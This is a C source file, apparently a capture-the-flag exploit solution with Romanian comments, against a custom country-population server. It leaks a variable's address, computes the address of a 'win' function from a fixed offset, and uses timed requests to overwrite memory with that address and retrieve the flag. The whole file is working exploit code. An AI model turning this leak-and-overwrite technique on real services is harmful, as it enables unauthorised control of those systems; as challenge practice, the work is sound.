#include "request.h"

#define OFFSET_TO_WIN (0x100008330 - 0x100001380)

uint64_t win = 0xAAAAAAAAAAAAAAAA;

int main()
{
    int ret;
    // Ne asiguram ca avem o tara cu 0 populatie
    struct request add_country = {0};
    add_country.message = "ADD dummy_country 0";
    add_country.message_length = strlen(add_country.message);

    ret = create_request(&add_country, 1024);
    if (ret != 0)
    {
        puts("Err add_country");
        return -1;
    }

    sleep(1);

    // Dam leak la adresa variabilei population
    struct request leak = {0};
    leak.message = "POP dummy_country";
    leak.message_length = strlen(leak.message);

    ret = create_request(&leak, 1024);
    if (ret != 0)
    {
        puts("Err leak");
        return -1;
    }
    ret = read_response(&leak);

    // Calculam adresa functiei win cu ajutorul adresei la care am dat leak
    uint64_t pop_adr = strtoull(leak.response, NULL, 0);
    uint64_t win_adr = pop_adr - OFFSET_TO_WIN;

    //printf("OFF: %p\n", (void *)OFFSET_TO_WIN);
    //printf("POP: %p\n", (void *)pop_adr);
    //printf("WIN: %p\n", (void *)win_adr);

    //close_request(&leak);
    //close_request(&add_country);

    struct request get_flag = {0};
    struct request write_feedback = {0};

    get_flag.message = "FLG romania 1";
    get_flag.message_length = 14;

    write_feedback.message = "WRT calin 8 0";
    write_feedback.message_length = 14;

    just_connect(&get_flag);
    just_connect(&write_feedback);

    update_request(&get_flag, 0x4000);
    sleep(5);

    update_request(&write_feedback, 0x100);

    write_feedback.message = &win_adr;
    write_feedback.message_length = 8;
    update_request(&write_feedback, 0x100);

    //close_request(&write_feedback);
    sleep(2);
    get_flag.message = "ACK";
    get_flag.message_length = 4;
    update_request(&get_flag, 0x100);
    read_response(&get_flag);
    read_response(&get_flag);
    printf("%s\n", get_flag.response);
    close_request(&write_feedback);
    return 0;
}